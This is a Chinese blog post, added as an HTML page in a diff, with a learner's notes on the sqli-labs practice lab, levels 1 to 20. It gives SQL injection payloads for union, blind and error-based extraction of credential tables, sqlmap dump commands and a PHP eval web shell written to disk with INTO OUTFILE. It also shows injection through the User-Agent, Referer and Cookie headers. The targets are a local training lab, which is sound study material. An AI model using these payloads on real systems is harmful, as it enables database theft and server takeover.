@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>y@7q | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">y@7q</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            sqli-labs刷题
+        </div>
+        <div class="post-meta">
+            2025-03-20
+        </div>
+        <div class="post-md">
+            <p>[TOC] </p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>花了两天时间，终于把sqli-lab前20关都刷完了！感觉之前只有朦胧的对sqli的印象，结果现在才知道我见过的只是get类型的union注入，最简单的那种（晕）。。。<br>了解和实践了很多注入手法，union，报错，延时，布尔…..前段时间面试实验室的时候其实还不了解就敢说自己懂（惭愧<br>《从0到1：CTFer成长之路》这本书我觉得很棒，希望能尽快看完！<br>我参考了很多师傅的wp以及相关文章，一并附在了文章结尾。那么，下面是我的题目总结，有一些没写或者简写，以及没有图片（还没想到怎样简化插入图片还能上传到网站的办法），如果观感不好请多担待。</p>
+<span id="more"></span>
+
+<h1 id="sql注入基础思路"><a href="#sql注入基础思路" class="headerlink" title="sql注入基础思路"></a>sql注入基础思路</h1><h2 id="符号说明"><a href="#符号说明" class="headerlink" title="符号说明"></a>符号说明</h2><table>
+<thead>
+<tr>
+<th align="center"><strong>运算符</strong></th>
+<th align="center"><strong>类型</strong></th>
+<th align="center"><strong>功能</strong></th>
+<th align="center"><strong>标准性</strong></th>
+<th align="center"><strong>适用场景</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>&amp;</code></td>
+<td align="center">位运算符</td>
+<td align="center">按位与运算或字符串连接</td>
+<td align="center">非通用（依数据库）</td>
+<td align="center">二进制运算、特定数据库字符串拼接</td>
+</tr>
+<tr>
+<td align="center"><code>&amp;&amp;</code></td>
+<td align="center">逻辑运算符</td>
+<td align="center">逻辑与运算（短路）</td>
+<td align="center">非标准（仅 MySQL）</td>
+<td align="center">MySQL 环境简化代码</td>
+</tr>
+<tr>
+<td align="center"><code>AND</code></td>
+<td align="center">逻辑运算符</td>
+<td align="center">逻辑与运算（短路）</td>
+<td align="center">标准 SQL</td>
+<td align="center">跨数据库兼容、复杂条件组合</td>
+</tr>
+</tbody></table>
+<h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><p>数字型：<code>select * from table where id =$id</code><br>字符型：<code>select * from table where id=&#39;$id&#39;</code><br>加上<code>&#39;</code>报错，再加上<code>%23</code>说明存在url注入点。</p>
+<p>如果在id处输入3-1或6&#x2F;3显示的结果和id&#x3D;2是一致的，则是<strong>数字型</strong>，反之则是<strong>字符型</strong>。</p>
+<h1 id="less-1-less-2"><a href="#less-1-less-2" class="headerlink" title="less-1&amp;less-2"></a>less-1&amp;less-2</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><code>http://www.sqli-lab.cn/Less-1/?id=1</code>输入<code>id=1+1</code>，若返回结果与<code>id=2</code>一致，则为数字型,否则为字符型。<code>http://sqli-labs/Less-1/?id=1+1</code>并未显示，说明是字符型。<br><strong>爆表名</strong>：<code>http://localhost/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23</code><br><strong>爆列名</strong>：<code>http://localhost/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; %23</code><br><strong>爆数据</strong>：<code>http://localhost/Less-1/?id=-1&#39; union select 1,password,username from users %23</code></p>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p><strong>less-2同样验证后可知是数字型，后续做法一致。</strong></p>
+<h1 id="less-3-less-4"><a href="#less-3-less-4" class="headerlink" title="less-3&amp;less-4"></a>less-3&amp;less-4</h1><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>less-3的闭合为<code>&#39;)</code>。</p>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>less-3的闭合为<code>&quot;)</code>。</p>
+<h1 id="less-5-less-6"><a href="#less-5-less-6" class="headerlink" title="less-5&amp;less-6"></a>less-5&amp;less-6</h1><p>less-5开始不再正常有回显了，但仍然有报错。</p>
+<h2 id="盲注中的相关函数"><a href="#盲注中的相关函数" class="headerlink" title="盲注中的相关函数:"></a>盲注中的相关函数:</h2><ul>
+<li><code>left(a,b)</code>:返回字符串a中最左边的b个字符。</li>
+<li><code>substr(a,b,c</code>)&#96;:从位置b开始截取a字符中的前c个字符。</li>
+<li><code>ascii()</code>:ascii转换,<em>a-z的ascii值：97-122</em></li>
+</ul>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>首先测试到闭合为<code>&#39;</code>闭合，开始<strong>布尔盲注</strong><br><code>http://localhost/Less-5/?id=1&#39; and length(database())=8 %23</code>得知数据库名长度为8。</p>
+<ol>
+<li>然后开始猜解数据库的名称：<br><strong>第一个字母</strong>：<code>http://localhost/Less-5/?id=1&#39; and substr(database(),1,1)=&#39;s&#39; %23</code><br><strong>第二个字母</strong>：<code>http://localhost/Less-5/?id=1&#39; and substr(database(),2,1)=&#39;e&#39; %23</code><br>……（以此类推）<br>最终得到数据库名称为<code>security</code>。<br>（根据测试，输入错误函数会报错可直接得到当前库名：<code>http://localhost/Less-5/?id=1&#39; and subbstr(database(),1,1)=&#39;s&#39; %23</code>）</li>
+<li>猜解表名：<br><strong>第一个字母</strong>：<code>http://localhost/Less-5/?id=1&#39; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#39;e&#39; %23</code><br><strong>第一个字段</strong>：<code>http://localhost/Less-5/?id=1&#39; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,5)=&#39;email&#39; %23</code></li>
+</ol>
+<p>……<br>绵绵无期，是sqlmap登场的时候了！</p>
+<h4 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h4><ul>
+<li><strong>爆表</strong>：<code>python E:\myCTFTools\WebTools\sqlmap\sqlmap.py -u &quot;http://127.0.0.1/Less-5/?id=1&quot; -D security --tables --batch --level=5</code><br><code>--technique=B</code>指定注入类型为布尔<br><code>--technique=T</code>指定注入类型为延时<br><code>-D security</code>指定库<br><code>--tables</code>爆表名<br><code>--level=5</code>等级为5</li>
+<li><strong>爆列</strong>：<code>python E:\myCTFTools\WebTools\sqlmap\sqlmap.py -u &quot;http://127.0.0.1/Less-5/?id=1&quot; -D security -T emails  --columns --batch --level=5</code></li>
+<li><strong>数据</strong>：<code>python E:\myCTFTools\WebTools\sqlmap\sqlmap.py -u &quot;http://127.0.0.1/Less-5/?id=1&quot; -D security -T emails  -C &quot;usename,password&quot; --dump --batch --level=5</code></li>
+</ul>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>也可以使用<strong>报错注入</strong>。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database(),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显<code>XPATH syntax error: &#39;~security~&#39;</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显<code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select group_concat(column_name) from information_schema.columns where table_name=<span class="string">&quot;users&quot;</span> and table_schema=database()),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>回显<code>XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,substr((select group_concat(concat(username,&#x27;:&#x27;,password)) FROM users),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>同less-5,闭合方式不同。</p>
+<h1 id="less-7-into-outlife-less-8"><a href="#less-7-into-outlife-less-8" class="headerlink" title="less-7 into outlife&amp;less-8"></a>less-7 into outlife&amp;less-8</h1><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><h3 id="常见闭合："><a href="#常见闭合：" class="headerlink" title="常见闭合："></a>常见闭合：</h3><p><code>&#39;$id&#39;</code><br><code>&quot;$id&quot;</code><br><code>(&#39;$id&#39;)</code><br><code>(&quot;$id&quot;)</code><br><code>((&#39;id&#39;))</code></p>
+<p>测试为<code>((&#39;id&#39;))</code>闭合，into outlife写马连接，<code>http://localhost/Less-7/?id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;&quot; INTO OUTFILE &quot;E:/myCTFTools/range/sqli-labs/Less-7/shell.php&quot;   %23</code><br><strong>不过在写入之前需要在mysql目录下的my.ini中加上<code>secure_file_priv=&#39;\&#39;</code>开启写入权限。</strong></p>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>同less-7</p>
+<h1 id="less-9-回显相同，时间盲注"><a href="#less-9-回显相同，时间盲注" class="headerlink" title="less-9 回显相同，时间盲注"></a>less-9 回显相同，时间盲注</h1><h1 id="less-10-同less-9-闭合不同"><a href="#less-10-同less-9-闭合不同" class="headerlink" title="less-10 同less-9,闭合不同"></a>less-10 同less-9,闭合不同</h1><h1 id="less-11-登录框-万能密码"><a href="#less-11-登录框-万能密码" class="headerlink" title="less-11  登录框 万能密码"></a>less-11  登录框 万能密码</h1><p><code>admin&#39; or 1=1 %23</code></p>
+<p>直接在uname参数之后加上%23将后面注释掉，然后在那之后注入即可，步骤同less-1。</p>
+<h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><p>测试闭合为：<code>passwd=admin&amp;submit=Submit&amp;uname=admin&quot;) %23</code><br>然后同less-11思路一致。</p>
+<h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>测试闭合为：<code>admin&#39;)</code><br>但是只有报错，正确时无回显，所以判断为时间盲注或布尔盲注。</p>
+<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>测试闭合为：<code>admin&quot;</code></p>
+<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>测试闭合为：<code>admin&#39;</code><br>既无正确回显，也无报错。只能看出是否登陆成功。（时间，布尔，写马？（可，参考less-7 <code>payload: passwd=admin&amp;submit=Submit&amp;uname=-1&#39; union select 1,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;&quot; INTO OUTFILE &quot;E:/myCTFTools/range/sqli-labs/Less-15/shell.php&quot; %23</code>））</p>
+<h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><p>测试闭合为：<code>passwd=admin&amp;submit=Submit&amp;uname=admin&quot;) %23</code><br>（时间，布尔，写马)</p>
+<h1 id="less-17-修改密码界面-update注入点"><a href="#less-17-修改密码界面-update注入点" class="headerlink" title="less-17 (修改密码界面 update注入点)"></a>less-17 (修改密码界面 update注入点)</h1><p>参数：<code>passwd=admin&amp;submit=Submit&amp;uname=admin</code><br>修改密码想到后端会用到updete函数，查看源码果真如此，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆表名</strong>：<br>payload为：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=admin&#x27; <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>),0x7e),1) %23&amp;<span class="attribute">submit</span>=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+
+<p>时总是报错为：<code>Truncated incorrect DOUBLE value: &#39;admin&#39;</code>。<strong>这是因为<code>updatexml()</code>会返回布尔值为double类型，同时会把前面的admin强转为double失败导致报错。</strong><br>改为<code>1&#39;</code>:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=1&#x27; <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>),0x7e),1) %23&amp;<span class="attribute">submit</span>=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+
+<p>则是成功的。<br><strong>爆字段</strong>：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=1&#x27; <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&quot;users&quot;</span> <span class="keyword">and</span> <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>),0x7e),1) %23&amp;<span class="attribute">submit</span>=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆数据</strong>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=<span class="number">1</span>&#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select concat(password,&#x27;:&#x27;,username) from users),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span>&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+
+<p>此时会抛出错误：<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code>这是因为在原语句中已经正在使用这张表了，而子查询中的<code>SELECT ... FROM users</code>也引用了同一张表，导致MySQL拒绝执行。<br><strong>此时只需要用AS大法即可！</strong></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> group_concat(concat(<span class="keyword">password</span>,<span class="string">&#x27;:&#x27;</span>,username)) <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> users) <span class="keyword">AS</span> a),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span>&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+
+<p><strong>但是会发现显示不全</strong>。这时就应该用相关函数分段显示了，substr(), mid(),left(), right()……等都可以。<br>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(concat(username,<span class="string">&#x27;:&#x27;</span>,password)) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users) <span class="keyword">AS</span> a),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>我尝试了用sqlmap来dump下来less-17的users表，但是失败了，这是为什么？（不太清楚,要么是无数据，要么是空表）</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[18:28:38] [INFO] adjusting time delay to 2 seconds due to good response times</span><br><span class="line">3</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|<span class="string"> id   </span>|<span class="string"> password </span>|<span class="string"> username </span>|</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">+------+----------+----------+</span><br><span class="line"></span><br><span class="line">[18:28:41] [INFO] table &#x27;`security`.users&#x27; dumped to CSV file &#x27;C:\Users\Lenovo\AppData\Local\sqlmap\output\127.0.0.1\dump\security\users.csv&#x27;</span><br><span class="line">[18:28:41] [INFO] fetched data logged to text files under &#x27;C:\Users\Lenovo\AppData\Local\sqlmap\output\127.0.0.1&#x27;</span><br><span class="line"></span><br><span class="line">[<span class="symbol">*</span>] ending @ 18:28:41 /2025-03-16/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\myCTFTools\WebTools\sqlmap&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="less-18-报错，延时盲注-User-Agent注入点"><a href="#less-18-报错，延时盲注-User-Agent注入点" class="headerlink" title="less-18(报错，延时盲注 User-Agent注入点)"></a>less-18(报错，延时盲注 User-Agent注入点)</h1><p>PHP 里用来获取客户端 IP 的变量												</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>] <span class="comment">#这个很少使用，不一定服务器都实现了。客户端可以伪造。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] <span class="comment">#客户端可以伪造。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="comment">#客户端不能伪造。</span></span><br></pre></td></tr></table></figure>
+
+<p><code>User-Agent: 1&#39;</code>报错<br>看到报错：<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;127.0.0.1&#39;, &#39;admin&#39;)&#39; at line 1</code><br>推测有三个值，构造如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>1&#x27;,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1))  #</span><br></pre></td></tr></table></figure>
+
+<h1 id="less-19-报错，延时盲注-Referer注入点"><a href="#less-19-报错，延时盲注-Referer注入点" class="headerlink" title="less-19(报错，延时盲注 Referer注入点)"></a>less-19(报错，延时盲注 Referer注入点)</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>1&#x27;,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)) #</span><br></pre></td></tr></table></figure>
+
+<h1 id="less-20-报错，延时盲注-Cookie注入点"><a href="#less-20-报错，延时盲注-Cookie注入点" class="headerlink" title="less-20(报错，延时盲注 Cookie注入点)"></a>less-20(报错，延时盲注 Cookie注入点)</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin&#x27; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) #</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266244">https://www.anquanke.com/post/id/266244</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11610385.html">https://www.cnblogs.com/-qing-/p/11610385.html</a><br><a target="_blank" rel="noopener" href="https://weread.qq.com/web/bookDetail/77d32500721a485577d8eee">从0到1：CTFer成长之路</a>（其中的sqli部分）<br><a target="_blank" rel="noopener" href="http://blog.csdn.net/qq_46432288/article/details/109295457">sqli-labs-less-5布尔盲注+错误注入（超详细，小白专属）</a><br><a target="_blank" rel="noopener" href="https://github.com/jason-blog/blog/blob/master/Kali/Sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E3%80%90%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0%E7%B2%BE%E5%8D%8E%E6%95%B4%E7%90%86%E3%80%91.MD">Sqlmap使用教程【个人笔记精华整理】</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Timesi/p/16661422.html">SQLI-LABS(Less-7)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zxj993853579/article/details/128810152">sqli-labs less-7 一句话木马</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk3NTEyMzQzOA==&mid=2247484371&idx=1&sn=995cc8f24e3ad1a2f4b010d0e3dddf6a&chksm=c5279ce2c1c3e7429ae5a87b8bd3df637f3bd088e244b0b8a3d455082e3a965a8394bcec2d05#rd">最适合POST型SQL注入小白之sqli-labs靶场（less-17~less-21：POST手动注入和sqlmap自动注入)</a><br><a target="_blank" rel="noopener" href="https://tari.moe/2022/sqli-labs">sqli-labs 靶场 1-65 通关记</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13849619.html#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B-1">sqli-labs 通关指南：Less 18、19</a></p>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 y@7q</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
